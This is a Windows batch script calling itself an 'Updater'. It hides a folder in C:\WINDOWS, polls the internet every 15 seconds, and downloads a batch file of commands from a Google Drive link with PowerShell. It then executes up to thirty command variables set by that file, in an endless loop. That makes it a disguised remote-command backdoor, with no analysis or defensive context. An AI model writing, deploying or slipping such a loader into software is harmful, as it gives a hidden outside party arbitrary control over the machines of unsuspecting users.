@echo off
attrib +s +h "C:\WINDOWS\UDP"
ECHO ------------Updater %time% %date%------------- >> "C:\Windows\RDE\UpdaterL\log.txt"
:CHECKER
sleep 15
Ping www.google.nl -n 1 -w 1000 >nul 2>&1
IF ERRORLEVEL 1 (set internet=0) else (set internet=1)
IF %internet%==0 goto RUN
:Download
powershell.exe -command Invoke-WebRequest 'https://drive.google.com/uc?export=download"&"id=1G1E0wvNcLvsKFZwFr2yH2iPZ8FqOHTjU' -OutFile "C:\Windows\UDP\UpdaterL\Commands.bat" || goto CHECKER
:RUN
call "C:\Windows\UDP\UpdaterL\Commands.bat"
:Commands
%command1%
%command2%
%command3%
%command4%
%command5%
%command6%
%command7%
%command8%
%command9%
%command10%
%command11%
%command12%
%command13%
%command14%
%command15%
%command16%
%command17%
%command18%
%command19%
%command20%
%command21%
%command22%
%command23%
%command24%
%command25%
%command26%
%command27%
%command28%
%command29%
%command30%
goto CHECKER